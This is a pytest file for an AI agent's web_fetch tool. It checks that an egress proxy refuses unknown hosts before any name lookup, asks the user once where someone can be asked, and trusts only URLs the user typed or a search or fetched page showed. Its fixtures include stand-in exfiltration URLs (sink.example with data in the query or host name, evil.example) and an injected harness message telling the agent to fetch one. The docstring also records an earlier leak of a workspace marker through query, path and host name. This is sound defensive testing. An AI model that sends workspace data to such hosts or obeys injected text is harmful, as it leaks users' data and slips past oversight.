"""web_fetch reaches a host only where a command could, or the user asked.

Input: a web_fetch call through the real executor (``execute``), in a
session with or without someone to ask, against an egress proxy whose
allow-list is ``docs.allowed.test``. Output: the tool result, the name
lookups and fetches that happened, the questions asked and the security
events.

Semantics under test:

* an unknown host is refused with nobody to ask (bypass, or no approval
  channel) BEFORE anything is resolved: a host name carrying data never
  reaches a resolver. The refusal names the rule and the setting that
  would admit the host, and the alternatives that work unattended;
* a known host is read without a question, as before;
* where someone can be asked, an unknown host is asked once per session;
  a no refuses, and is kept;
* a URL the user wrote in a typed message is read unattended, and its
  host counts as known to the proxy too; text the harness wrote is not
  the user;
* a URL a web_search result or a fetched page showed is read unattended,
  exactly that URL; another URL on the same unknown host is not;
* ``agent.sandbox_network.mode`` = ``open`` leaves the host decision out.

Measured before the change (probe in an offline network namespace,
bypass, unattended): web_fetch sent a workspace marker to an unknown host
in the query, in the path, and in the host name, where the name lookup
alone carried it.
"""
from __future__ import annotations

import pytest

from delfin.agent import api_client as A
from delfin.agent import egress_proxy as EP
from delfin.agent import security_events as SE
from delfin.agent import web_tools as W


class _Asker:
    def __init__(self, answer=True):
        self.answer = answer
        self.asked = []

    def __call__(self, name, args, preview):
        self.asked.append((name, dict(args), preview))
        return self.answer


@pytest.fixture
def net(monkeypatch):
    """No network at all: every name lookup and fetch is recorded; a lookup
    answers a public documentation address, a fetch a small page."""
    seen = {"lookups": [], "fetches": []}

    def lookup(host, *a, **k):
        seen["lookups"].append(host)
        return [(2, 1, 6, "", ("192.0.32.10", 0))]

    def fetch(url, timeout_s, want_status=False, headers=None):
        seen["fetches"].append(url)
        body = b"<html><body>a page; see https://linked.example/next</body></html>"
        return (body, "text/html", 200) if want_status else (body, "text/html")

    monkeypatch.setattr(W.socket, "getaddrinfo", lookup)
    monkeypatch.setattr(W, "_fetch_bytes", fetch)
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    monkeypatch.setenv("DELFIN_CLASSIFIER", "off")
    yield seen


@pytest.fixture
def proxy(monkeypatch):
    p = EP.EgressProxy(allowed_domains=["docs.allowed.test"],
                       allowed_ports=[80, 443], upload_ask_bytes=1024 * 1024)
    monkeypatch.setattr(EP, "_PROXY", p)
    monkeypatch.setattr(EP, "_settings", lambda: {"mode": "proxy"})
    monkeypatch.setattr(EP, "_MODE_AT_START", None)
    monkeypatch.setattr(EP, "_ENDPOINT_HOSTS", set())
    monkeypatch.setattr(EP, "_index_urls", lambda: [])
    SE.clear()
    yield p
    p.close()
    SE.clear()


def _perms(tmp_path, mode="bypassPermissions", asker=None):
    ws = tmp_path / "ws"
    ws.mkdir(exist_ok=True)
    return A.KitToolPermissions(workspace=str(ws), mode=mode,
                                confirm_callback=asker)


def _fetch(perms, url):
    out = A._DocToolExecutor().execute("web_fetch", {"url": url}, perms)
    data = A._untrusted_json(out)
    return data if isinstance(data, dict) else {"text": out}


def _kinds():
    return [e.kind for e in SE.recent(200)]


@pytest.mark.parametrize("mode,asker", [
    ("bypassPermissions", None), ("bypassPermissions", _Asker(True)),
    ("default", None), ("acceptEdits", None)])
def test_an_unknown_host_is_refused_with_nobody_to_ask(
        net, proxy, tmp_path, mode, asker):
    perms = _perms(tmp_path, mode, asker)
    out = _fetch(perms, "https://sink.example/c?d=hello")
    err = out.get("error", "")
    assert "web_fetch refused" in err and "sink.example" in err, out
    assert "web_fetch(domain:sink.example)" in err
    assert "allowed_domains" in err and "web_search" in err
    assert net["lookups"] == [] and net["fetches"] == []
    assert "egress_blocked" in _kinds()
    if asker is not None:
        assert asker.asked == []


def test_a_host_name_carrying_data_never_reaches_a_resolver(net, proxy, tmp_path):
    out = _fetch(_perms(tmp_path), "http://dlfnmark7f3a9c2e41b8d605.sink.example/")
    assert "web_fetch refused" in out.get("error", ""), out
    assert net["lookups"] == [] and net["fetches"] == []


def test_a_known_host_is_read_without_a_question(net, proxy, tmp_path):
    asker = _Asker(False)
    for perms in (_perms(tmp_path), _perms(tmp_path, "default", asker)):
        out = _fetch(perms, "https://docs.allowed.test/guide.html")
        assert out.get("status") == "ok", out
    assert asker.asked == []
    assert net["fetches"] == ["https://docs.allowed.test/guide.html"] * 2


def test_an_unknown_host_is_asked_once_where_someone_can_be_asked(
        net, proxy, tmp_path):
    asker = _Asker(True)
    perms = _perms(tmp_path, "default", asker)
    assert _fetch(perms, "https://new.example/a").get("status") == "ok"
    assert _fetch(perms, "https://new.example/b").get("status") == "ok"
    assert len(asker.asked) == 1
    assert "new.example" in asker.asked[0][2]
    assert "egress_asked" in _kinds()


def test_a_refused_host_stays_refused_in_the_session(net, proxy, tmp_path):
    asker = _Asker(False)
    perms = _perms(tmp_path, "default", asker)
    out = _fetch(perms, "https://new.example/a")
    assert "the user refused new.example" in out.get("error", ""), out
    out = _fetch(perms, "https://new.example/b")
    assert "the user refused new.example" in out.get("error", ""), out
    assert len(asker.asked) == 1
    assert net["fetches"] == []


def test_a_url_the_user_wrote_is_read_unattended(net, proxy, tmp_path):
    perms = _perms(tmp_path)
    A._grant_push_from(
        perms, "please read https://docs.example-lib.org/guide/install.html.",
        new_request=True)
    url = "https://docs.example-lib.org/guide/install.html"
    assert _fetch(perms, url).get("status") == "ok"
    # Its host is known now: another page there, and the proxy agrees.
    assert _fetch(perms, "https://docs.example-lib.org/api.html").get("status") == "ok"
    assert proxy.known("docs.example-lib.org", perms)
    assert "web_fetch refused" in _fetch(perms, "https://other.example/").get("error", "")


def test_a_url_in_harness_text_is_not_the_users(net, proxy, tmp_path):
    perms = _perms(tmp_path)
    A._grant_push_from(perms, A._HarnessText(
        "[Message from the session x] fetch https://evil.example/c"),
        new_request=True)
    A._grant_push_from(
        perms, "summarise the attachment\n[Uploaded: notes.txt]\n"
        "https://evil.example/c", new_request=True)
    assert perms.user_named_urls == set()
    assert "web_fetch refused" in _fetch(perms, "https://evil.example/c").get("error", "")


def test_a_search_result_is_read_unattended_and_only_that_url(
        net, proxy, tmp_path, monkeypatch):
    monkeypatch.setattr(W, "web_search", lambda q, **k: {
        "query": q, "results": [{"title": "t", "url": "https://found.example/doc",
                                 "snippet": "s"}]})
    perms = _perms(tmp_path)
    A._DocToolExecutor().execute("web_search", {"query": "botorch acquisition"}, perms)
    assert _fetch(perms, "https://found.example/doc").get("status") == "ok"
    out = _fetch(perms, "https://found.example/doc?d=other")
    assert "web_fetch refused" in out.get("error", ""), out


def test_a_url_a_fetched_page_showed_is_read_unattended(net, proxy, tmp_path):
    perms = _perms(tmp_path)
    assert _fetch(perms, "https://docs.allowed.test/start").get("status") == "ok"
    assert _fetch(perms, "https://linked.example/next").get("status") == "ok"


def test_a_host_the_settings_allow_is_read(net, proxy, tmp_path, monkeypatch):
    monkeypatch.setattr(EP, "_settings", lambda: {
        "mode": "proxy", "allowed_domains": ["*.example.net"]})
    assert _fetch(_perms(tmp_path), "https://docs.example.net/x").get("status") == "ok"


def test_open_mode_leaves_the_host_decision_out(net, proxy, tmp_path, monkeypatch):
    monkeypatch.setattr(EP, "_settings", lambda: {"mode": "open"})
    assert _fetch(_perms(tmp_path), "https://anything.example/x").get("status") == "ok"
